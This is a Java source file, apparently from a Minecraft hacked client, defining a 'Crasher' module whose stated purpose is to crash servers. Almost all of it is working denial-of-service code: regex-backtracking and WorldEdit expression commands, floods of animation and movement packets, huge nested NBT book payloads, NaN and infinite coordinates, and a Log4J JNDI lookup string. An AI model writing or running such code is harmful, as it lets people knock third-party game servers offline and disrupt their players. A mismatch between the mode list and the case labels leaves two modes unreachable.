package wtf.atani.module.impl.misc;

import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import wtf.atani.event.events.UpdateEvent;
import wtf.atani.event.radbus.Listen;
import wtf.atani.module.Module;
import wtf.atani.module.data.ModuleInfo;
import wtf.atani.module.data.enums.Category;
import wtf.atani.value.impl.StringBoxValue;
import net.minecraft.nbt.*;
import java.util.Random;

@ModuleInfo(name = "Crasher", description = "Tries to crash a server", category = Category.MISCELLANEOUS)
public class Crasher extends Module {

    public StringBoxValue mode = new StringBoxValue("Mode", "Which mode will the module use?", this, new String[]{"Swing", "Sign", "Paralyze", "Chunk Load", "NaN Position", "Multiverse", "Fawe", "Mare", "Exploit Fixer (Old)"});

    private Random random = new Random();

    @Listen
    public void onUpdate(UpdateEvent updateEvent) {
    	if(mc.thePlayer == null || mc.theWorld == null)
    		return;
        switch (mode.getValue()) {
            case "Multiverse":
                mc.thePlayer.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                break;
            case "Fawe":
                sendPacketUnlogged(new C14PacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                break;
            case "Mare":
                for (int i = 0; i < 1200; i++) {
                    final NBTTagCompound tag = new NBTTagCompound();
                    final NBTTagList list = new NBTTagList();
                    final StringBuilder value = new StringBuilder().append("{");
                    final int amount = 1200;

                    int i2;
                    for (i2 = 0; i2 < amount; i2++) {
                        value.append("extra:[{");
                    }

                    for (i2 = 0; i2 < amount; i2++) {
                        value.append("text:\u2F9F}],");
                    }

                    value.append("text:\u2F9F}");
                    list.appendTag(new NBTTagString(value.toString()));
                    tag.setTag("pages", list);
                    final ItemStack book = new ItemStack(Items.writable_book);
                    book.setTagCompound(tag);
                    sendPacketUnlogged(new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ), 2, book, 0.0F, 0.0F, 0.0F));
                }
                break;
            case "Log4J":
                mc.thePlayer.sendChatMessage("/ ${jndi:rmi://localhost:3000}");
                break;
            case "Swing":
                for (int i = 0; i < 300; i++)
                    sendPacketUnlogged(new C0APacketAnimation());
                break;
            case "Sign":
                final IChatComponent[] signText = new IChatComponent[]{new ChatComponentText(random.nextInt(1000000000) + ""), new ChatComponentText(random.nextInt(1000000000) + ""), new ChatComponentText(random.nextInt(1000000000) + ""), new ChatComponentText(random.nextInt(1000000000) + "")};
                sendPacketUnlogged(new C12PacketUpdateSign(new BlockPos(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY), signText));
                break;
            case "Paralyze":
                if (isInsidePlayer()) {
                    for (int loop = 0; loop < 500; ++loop) {
                        sendPacketUnlogged(new C03PacketPlayer(true));
                    }
                }
                break;
            case "Chunk Load":
                double x = mc.thePlayer.posX, y = mc.thePlayer.posY, z = mc.thePlayer.posZ;

                for (int i = 0; i < 32000; i++)
                    sendPacketUnlogged(new C03PacketPlayer.C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
                break;
            case "Nan Position":
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                        Float.NaN,
                        Float.NaN,
                        Float.NaN,
                        true
                ));
                break;
            case "Exploit Fixer (Old)":
                for (int index = 0; index < 2500; ++index) {
                    sendPacketUnlogged(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 999 * index, mc.thePlayer.getEntityBoundingBox().minY + 999 * index, mc.thePlayer.posZ + 999 * index, true));
                }
                break;
        }
    }

    private boolean isInsidePlayer() {
        for (EntityPlayer entityPlayer : mc.theWorld.playerEntities) {
            if (entityPlayer instanceof EntityPlayerSP)
                continue;
            if (entityPlayer.getDistanceToEntity(mc.thePlayer) <= 0.995D) {
                return true;
            }
        }
        return false;
    }

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }
}
